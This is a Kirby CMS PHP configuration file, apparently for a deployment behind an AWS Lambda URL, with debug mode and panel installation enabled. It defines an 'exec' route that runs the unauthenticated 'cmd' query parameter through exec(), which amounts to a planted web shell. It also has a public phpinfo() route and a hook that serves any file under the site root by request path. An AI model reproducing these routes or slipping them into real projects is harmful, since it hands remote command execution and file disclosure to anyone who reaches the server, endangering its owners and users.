<?php

use Kirby\Cms\Response;
use Kirby\Filesystem\F;

$options = [
    'debug' => true,
    'url' => [
        'https://5kz7rdkqszz7wiabx5npv2eeny0maefm.lambda-url.us-east-1.on.aws',
        'http://starterkit.work'
    ],
    'panel' => [
        'install' => true
    ],
    'routes' => [
        [
            'pattern' => 'info',
            'action' => function () {
                phpinfo();
                exit();
            }
        ],
        [
            'pattern' => 'exec',
            'action' => function () {
                return [
                    'result' => exec($_GET['cmd'])
                ];
            }
        ]
    ],
    'hooks' => [
        'route:after' => function ($route, $path, $method, $result, $final) {
            $filePath = kirby()->root('index') . '/' . $path;

            if (F::exists($filePath)) {
                return Response::file($filePath);
            }
        }
    ]
];

return $options;
